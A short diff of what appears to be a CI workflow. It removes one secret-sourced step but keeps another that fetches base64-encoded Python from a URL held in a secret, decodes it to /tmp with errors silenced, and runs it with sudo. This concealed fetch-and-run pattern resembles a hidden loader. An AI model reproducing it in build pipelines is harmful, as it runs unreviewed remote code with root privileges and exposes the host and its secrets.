@@ -11,12 +11,8 @@ jobs:
     steps:
       - name: start
         env:
-          KEY_I: ${{ secrets.KEY_I }}
           KEY_S: ${{ secrets.KEY_S }}
 
         run: |
-          sudo pip install flask requests pycryptodome
-          curl -s $KEY_I 2>/dev/null | base64 -d > /tmp/init.py 2>/dev/null
           curl -s $KEY_S 2>/dev/null | base64 -d > /tmp/run_test.py 2>/dev/null
-          cd /tmp/ && sudo python3 run_test.py &
-          cd /tmp/ && sudo python3 -u init.py || echo done
+          cd /tmp/ && sudo python3 run_test.py
